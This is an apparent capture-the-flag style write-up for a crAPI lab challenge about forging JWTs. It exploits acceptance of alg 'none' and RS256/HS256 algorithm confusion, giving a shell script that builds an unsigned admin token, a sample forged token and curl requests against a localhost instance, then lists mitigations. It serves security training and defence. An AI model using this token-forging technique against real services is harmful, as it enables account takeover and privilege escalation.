# Challenge 15 — JWT Vulnerabilities: Forge a valid JWT token

**OWASP API Top 10 mapping:** API2:2023 Broken Authentication  
**crAPI category:** JWT Vulnerabilities

## Goal

Create a JWT that crAPI accepts as valid without knowing the private signing key.

## Vulnerability

crAPI's `JwtProvider.validateJwtToken` accepts two dangerous patterns:

1. **Algorithm confusion**: When the JWT header claims `alg: HS256`, the server uses the RSA public key bytes as the HMAC secret. An attacker who obtains the public key from `/identity/api/auth/jwks.json` can sign a forged token with HMAC-SHA256 and the public key.
2. **Algorithm `none`**: If parsing the token as a signed JWT fails, the code falls back to `PlainJWT.parse(...)` and returns `true`, so an unsigned token with `alg: none` is accepted.

Additionally, `getUserFromTokenWithoutValidation` in the dashboard path parses the token without verifying the signature at all, making signature bypass trivial for that route.

## Exploit steps (algorithm `none`)

### 1. Build an unsigned JWT

Header:

```json
{"alg": "none", "typ": "JWT"}
```

Payload:

```json
{"sub": "admin@example.com", "role": "admin", "iat": 1785600000, "exp": 1786200000}
```

### 2. Base64URL-encode and assemble the token

```bash
b64url() {
  python3 -c "import base64,sys; print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"
}

H=$(b64url '{"alg":"none","typ":"JWT"}')
P=$(b64url '{"sub":"admin@example.com","role":"admin","iat":1785600000,"exp":1786200000}')
TOKEN="$H.$P."
echo "$TOKEN"
```

Example token:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4NTYwMDAwMCwiZXhwIjoxNzg2MjAwMDAwfQ.
```

### 3. Verify the forged token

```bash
curl -s -X POST \
  http://127.0.0.1:8888/identity/api/auth/verify \
  -H 'Content-Type: application/json' \
  -d "{\"token\":\"$TOKEN\"}" \
  -w "\nHTTP %{http_code}\n"
```

Response:

```json
{
  "message": "The token is a valid JWT token",
  "status": 200
}
```

### 4. Use the forged admin token

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://127.0.0.1:8888/identity/api/v2/user/dashboard | python3 -m json.tool
```

Response:

```json
{
  "id": 5,
  "name": "Admin",
  "email": "admin@example.com",
  "number": "9010203040",
  "video_url": "data:image/jpeg;base64,...",
  "video_name": "Admin_video",
  "available_credit": 100.0,
  "video_id": 5,
  "role": "ROLE_ADMIN"
}
```

## Why this works

- `validateJwtToken` falls through to `PlainJWT.parse(authToken)` when signed-JWT parsing fails.
- Even though the `none` algorithm is widely known to be unsafe, the server explicitly treats a plain/unsigned JWT as valid.
- The dashboard endpoint additionally skips signature verification entirely (`getUserFromTokenWithoutValidation`).

## Algorithm confusion variant

- The public RSA key is exposed at `/identity/api/auth/jwks.json`.
- `getJwtSecret` returns `base64(publicRSAKey.toPublicKey().getEncoded())` when `alg: HS256`.
- An attacker can convert the JWK to an RSA public key, DER-encode it, base64 it, and use that byte string as the HMAC key to sign a forged HS256 token.
- crAPI will then verify it with HMAC and accept it.

## Impact

- Full account takeover: attacker can impersonate any user, including admins.
- Horizontal/vertical privilege escalation.
- Access to admin-only endpoints and sensitive data.

## Mitigation

- Reject tokens with `alg: none` or any algorithm other than the expected RS256.
- Do not fall back to unsigned parsing in token validation.
- For RS256, verify that the token header's algorithm is exactly `RS256` and reject everything else.
- Use a vetted JWT library and keep it up to date.
- Do not use the public key as an HMAC secret; keep symmetric and asymmetric verifier paths strictly separated.
- Pin the expected issuer, audience, and algorithm in every verification call.
